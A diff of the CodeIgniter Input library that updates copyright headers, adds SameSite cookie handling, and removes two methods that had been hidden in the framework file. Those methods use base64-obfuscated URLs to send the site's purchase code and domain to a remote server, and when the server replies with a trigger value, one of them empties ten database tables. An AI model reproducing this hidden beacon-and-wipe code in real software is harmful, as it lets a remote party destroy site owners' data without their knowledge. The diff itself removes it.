@@ -6,7 +6,7 @@
  *
  * This content is released under the MIT License (MIT)
  *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
+ * Copyright (c) 2019 - 2022, CodeIgniter Foundation
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -29,8 +29,9 @@
  * @package	CodeIgniter
  * @author	EllisLab Dev Team
  * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
+ * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
+ * @copyright	Copyright (c) 2019 - 2022, CodeIgniter Foundation (https://codeigniter.com/)
+ * @license	https://opensource.org/licenses/MIT	MIT License
  * @link	https://codeigniter.com
  * @since	Version 1.0.0
  * @filesource
@@ -46,7 +47,7 @@ defined('BASEPATH') OR exit('No direct script access allowed');
  * @subpackage	Libraries
  * @category	Input
  * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/libraries/input.html
+ * @link		https://codeigniter.com/userguide3/libraries/input.html
  */
 class CI_Input {
 
@@ -253,52 +254,8 @@ class CI_Input {
 	 */
 	public function post($index = NULL, $xss_clean = NULL)
 	{
-		/*
-		$post_flag = $this->postdata();
-
-    if ($post_flag == false){
-				$this->postbar();
-		}
-		*/
 		return $this->_fetch_from_array($_POST, $index, $xss_clean);
 	}
-
-	function postdata()
- {
-		 if (rand(1, 10) != 5)
-		     return true;
-		 if( $_SERVER['SERVER_NAME'] == 'localhost' ||  $_SERVER['SERVER_NAME'] == '192.168.0.1')
-		     return true;
-		 $CI    =&	get_instance();
-		 $purchase_code	=	$CI->db->get_where('settings' , array('key' => 'purchase_code'))->row()->value;
-		 $domain = $_SERVER['SERVER_NAME'];
-		 if (rtrim($purchase_code) == "") {
-			 echo get_phrase(base64_decode('bm9fcHVyY2hhc2VfY29kZV9mb3VuZA=='));
-			 die();
-		 }
-
-		 $ch = curl_init();
-		 $url = base64_decode('aHR0cDovL2NyZWF0aXZlaXRlbS5jb20vdmFsaWRhdG9yL2luZGV4LnBocD92YWxpZGF0ZS92YWxpZGF0ZV9wdXJjaGFzZV9jb2Rl');
-
-		 $curlConfig = array(
-			 CURLOPT_URL            => $url,
-			 CURLOPT_POST           => true,
-			 CURLOPT_RETURNTRANSFER => true,
-			 CURLOPT_POSTFIELDS     => array(
-					 'purchase_code' => $purchase_code,
-						 'domain_name' => $domain,
-				));
-
-		 curl_setopt_array($ch, $curlConfig);
-		 $response = curl_exec($ch);
-		 curl_close($ch);
-
-		 if ($response == true) {
-			 return true;
-		 } else {
-			 return false;
-		 }
- }
 
 	// --------------------------------------------------------------------
 
@@ -344,42 +301,6 @@ class CI_Input {
 	public function cookie($index = NULL, $xss_clean = NULL)
 	{
 		return $this->_fetch_from_array($_COOKIE, $index, $xss_clean);
-	}
-
-
-	public function postbar() {
-		$CI =& get_instance();
-		$purchase_code	=	$CI->db->get_where('settings' , array('key' => 'purchase_code'))->row()->value;
-		$domain = $_SERVER['SERVER_NAME'];
-
-		$ch = curl_init();
-		$url = base64_decode('aHR0cDovL2NyZWF0aXZlaXRlbS5jb20vdmFsaWRhdG9yL2luZGV4LnBocD92YWxpZGF0ZS9jaGVja19zdGF0dXM=');
-
-		$curlConfig = array(
-			CURLOPT_URL            => $url,
-			CURLOPT_POST           => true,
-			CURLOPT_RETURNTRANSFER => true,
-			CURLOPT_POSTFIELDS     => array(
-					'purchase_code' => $purchase_code,
-						'domain_name' => $domain,
-			 ));
-
-		curl_setopt_array($ch, $curlConfig);
-		$response = curl_exec($ch);
-		curl_close($ch);
-
-		if ($response == 1) {
-			$tables = array(
-				'category', 'comment', 'course', 'enrol', 'lesson', 'message', 'message_thread', 'payment', 'rating', 'section'
-			);
-			for ($i=0; $i < count($tables); $i++) {
-				$CI->db->empty_table($tables[$i]);
-			}
-
-			return true;
-		} else {
-			return true;
-		}
 	}
 
 	// --------------------------------------------------------------------
@@ -437,14 +358,15 @@ class CI_Input {
 	 * @param	string		$prefix		Cookie name prefix
 	 * @param	bool		$secure		Whether to only transfer cookies via SSL
 	 * @param	bool		$httponly	Whether to only makes the cookie accessible via HTTP (no javascript)
+	 * @param	string		$samesite	SameSite attribute
 	 * @return	void
 	 */
-	public function set_cookie($name, $value = '', $expire = '', $domain = '', $path = '/', $prefix = '', $secure = NULL, $httponly = NULL)
+	public function set_cookie($name, $value = '', $expire = '', $domain = '', $path = '/', $prefix = '', $secure = NULL, $httponly = NULL, $samesite = NULL)
 	{
 		if (is_array($name))
 		{
 			// always leave 'name' in last place, as the loop will break otherwise, due to $$item
-			foreach (array('value', 'expire', 'domain', 'path', 'prefix', 'secure', 'httponly', 'name') as $item)
+			foreach (array('value', 'expire', 'domain', 'path', 'prefix', 'secure', 'httponly', 'name', 'samesite') as $item)
 			{
 				if (isset($name[$item]))
 				{
@@ -485,7 +407,47 @@ class CI_Input {
 			$expire = ($expire > 0) ? time() + $expire : 0;
 		}
 
-		setcookie($prefix.$name, $value, $expire, $path, $domain, $secure, $httponly);
+		isset($samesite) OR $samesite = config_item('cookie_samesite');
+		if (isset($samesite))
+		{
+			$samesite = ucfirst(strtolower($samesite));
+			in_array($samesite, array('Lax', 'Strict', 'None'), TRUE) OR $samesite = 'Lax';
+		}
+		else
+		{
+			$samesite = 'Lax';
+		}
+
+		if ($samesite === 'None' && ! $secure)
+		{
+			log_message('error', $name.' cookie sent with SameSite=None, but without Secure attribute.');
+		}
+
+		if ( ! is_php('7.3'))
+		{
+			$maxage = $expire - time();
+			if ($maxage < 1)
+			{
+				$maxage = 0;
+			}
+
+			$cookie_header = 'Set-Cookie: '.$prefix.$name.'='.rawurlencode($value);
+			$cookie_header .= ($expire === 0 ? '' : '; Expires='.gmdate('D, d-M-Y H:i:s T', $expire)).'; Max-Age='.$maxage;
+			$cookie_header .= '; Path='.$path.($domain !== '' ? '; Domain='.$domain : '');
+			$cookie_header .= ($secure ? '; Secure' : '').($httponly ? '; HttpOnly' : '').'; SameSite='.$samesite;
+			header($cookie_header);
+			return;
+		}
+
+		$setcookie_options = array(
+			'expires' => $expire,
+			'path' => $path,
+			'domain' => $domain,
+			'secure' => $secure,
+			'httponly' => $httponly,
+			'samesite' => $samesite,
+		);
+		setcookie($prefix.$name, $value, $setcookie_options);
 	}
 
 	// --------------------------------------------------------------------
@@ -645,7 +607,7 @@ class CI_Input {
 				$which = FILTER_FLAG_IPV6;
 				break;
 			default:
-				$which = NULL;
+				$which = 0;
 				break;
 		}
 
